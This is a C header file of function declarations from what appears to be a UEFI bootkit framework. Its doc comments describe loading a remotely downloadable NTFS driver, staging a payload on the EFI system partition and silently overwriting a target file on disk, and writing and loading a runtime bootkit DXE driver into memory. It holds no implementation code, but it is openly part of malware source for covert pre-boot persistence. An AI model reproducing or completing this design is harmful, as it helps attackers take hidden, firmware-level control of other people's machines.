// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Functions Set Up
**/



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Configure the screen settings based on the global screen configuration value.
	@details        This function checks if the global screen configuration value, `Global_PreBootConfiguration_FunctionsConfiguration_Screen`, is set to the string "TRUE". If it is, the function configures the console output to the highest resolution.


	@retval         EFI_SUCCESS             The function completed successfully, and the screen configuration has been set.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_Screen();



/**
	@brief          Configures the display banner based on global banner configuration values.
	@details        This function checks multiple global configuration fields related to banner display. If the `Global_PreBootConfiguration_FunctionsConfiguration_Banner` field is set to "TRUE", the function proceeds to check other banner configuration fields. Depending on the values of these fields, it displays the appropriate banner content.


	@retval         EFI_SUCCESS             The function completed successfully and the banner was configured and displayed as specified.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_Banner();



/**
	@brief          Loads a UEFI NTFS driver to enable read/write access to NTFS partitions.
	@details        Depending on the configuration, this function either writes an embedded NTFS read/write driver to disk or downloads it from a remote server. It then attempts to load the driver image into memory so that NTFS volumes can be accessed with write permissions during UEFI execution.


	@retval         EFI_SUCCESS         Driver was successfully loaded or feature was disabled.
	@retval         Others              Failed to write, download, or load the NTFS driver.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_UEFIReadWriteNTFSDriver();



/**
	@brief          Deploys an additional binary component to disk.
	@details        This function writes the embedded component (kernel-mode driver, console application, ...) to the ESP under a temporary path. It then refreshes the filesystem mappings, scans each for the configured destination path, and if found, silently overwrites the target file. Before overwriting, it creates a backup of the original if one does not already exist.


	@retval         EFI_SUCCESS         The payload was successfully deployed to at least one partition.
	@retval         EFI_NOT_FOUND       The target file was not found on any scanned partition.
	@retval         Others              An error occurred while staging, remapping, or copying the payload.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_AdditionalComponentDisk();



/**
	@brief          Stages and loads the runtime bootkit (DXE Runtime Driver) into memory.
	@details        This function writes the embedded runtime bootkit image to the ESP under the configured path and then loads the image into memory (ready for execution at runtime).


	@retval         EFI_SUCCESS         Bootkit successfully loaded or feature disabled.
	@retval         Others              Failed to write or load the bootkit image.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_BootkitRuntime();



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
